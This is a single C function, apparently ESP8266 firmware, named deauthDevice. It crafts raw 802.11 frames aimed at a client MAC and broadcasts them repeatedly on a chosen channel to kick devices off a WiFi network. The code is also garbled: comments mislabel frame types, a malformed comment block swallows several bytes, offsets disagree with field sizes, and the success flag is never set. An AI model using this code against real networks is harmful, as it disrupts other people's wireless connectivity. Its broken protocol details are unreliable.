bool deauthDevice(uint8_t * mac, uint8_t wifi_channel) {
  bool success = false;
  uint8_t ap_mac[6];
  wifi_get_macaddr(0, ap_mac);
  uint8_t client_mac[6];
  memcpy(client_mac, mac, 6);
  uint8_t packet1[128] = {
    /*  0 - 1  */
    0x88,
    0x02, // type, subtype 88: authentication
    /*  2 - 3  */
    0x00,
    0x00, // duration (SDK takes care of that)
    /*  4 - 5  */
    0x02,
    0x00, // authentication algorithm (0: open, 1: shared, 2: WPA, 3: WPA-PSK, 4: WPA2, 5: WPA2-PSK, 6: WPA mixed mode)
    /*  6 - 7  */
    0x00,
    0x00, // authentication sequence number
    /*  8 - 13 */
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF, // receiver (AP)
    /* 14 - 19 */
    ap_mac[0],
    ap_mac[1],
    ap_mac[2],
    ap_mac[3],
    ap_mac[4],
    ap_mac[5], // sender (STA)
    /* 20 - 25 */
    ap_mac[0],
    ap_mac[1],
    ap_mac[2],
    ap_mac[3],
    ap_mac[4],
    ap_mac[5], // BSSID (AP)
    /* 26 - 27 */
    0x00,
    0x00, // status code
    /* 28 - 31 */
    0x01,
    0x00,
    0x00,
    0x00 // pairwise cipher suite count and list
  };

  uint8_t packet3[128] = {
    /*  0 - 1  */
    0x88,
    0x08, // type, subtype 88: authentication
    /*  2 - 3  */
    0x00,
    0x00, // duration (SDK takes care of that)
    /*  4 - 5  */
    0x01,
    0x00, // key information
    /*  6 - 7  */
    0x00,
    0x00, // key length
    /*  8 - 15 */
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF, // receiver (AP)
    /* 16 - 23 */
    ap_mac[0],
    ap_mac[1],
    ap_mac[2],
    ap_mac[3],
    ap_mac[4],
    ap_mac[5], // sender (STA)
    /* 24 - 31 */
    ap_mac[0],
    ap_mac[1],
    ap_mac[2],
    ap_mac[3],
    ap_mac[4],
    ap_mac[5], // BSSID (AP)
    /* 32 - 39 */
    client_mac[0],
    client_mac[1],
    client_mac[2],
    client_mac[3],
    client_mac[4],
    client_mac[5], // STA MAC address
    /* 40 - 51 / 0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // replay counter
    / 52 - 55 */
    0x00,
    0x00,
    0x00,
    0x00 // key IV
  };
  uint8_t packet4[128] = {
    /*  0 - 1  */
    0x88,
    0x08, // type, subtype 88: authentication
    /*  2 - 3  */
    0x00,
    0x00, // duration (SDK takes care of that)
    /*  4 - 5  */
    0x03,
    0x00, // key information
    /*  6 - 7  */
    0x00,
    0x00, // key length
    /*  8 - 15 */
    ap_mac[0],
    ap_mac[1],
    ap_mac[2],
    ap_mac[3],
    ap_mac[4],
    ap_mac[5], // receiver (STA)
    /* 16 - 23 */
    client_mac[0],
    client_mac[1],
    client_mac[2],
    client_mac[3],
    client_mac[4],
    client_mac[5], // sender (AP)
    /* 24 - 31 */
    client_mac[0],
    client_mac[1],
    client_mac[2],
    client_mac[3],
    client_mac[4],
    client_mac[5], // BSSID (AP)
    /* 32 - 39 */
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // replay counter
    /* 40 - 47 */
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00 // key IV
  };

  uint16_t packet1_size = sizeof(packet1);
  uint16_t packet3_size = sizeof(packet3);
  uint16_t packet4_size = sizeof(packet4);

  wifi_promiscuous_enable(0);
  wifi_set_channel(wifi_channel);
  wifi_promiscuous_enable(1);

  for (int i = 0; i < 10; i++) {
    wifi_send_pkt_freedom(packet1, packet1_size, true);
    wifi_send_pkt_freedom(packet3, packet3_size, true);
    wifi_send_pkt_freedom(packet4, packet4_size, true);
    delay(2);
  }

  wifi_promiscuous_enable(0);
  return success;

}
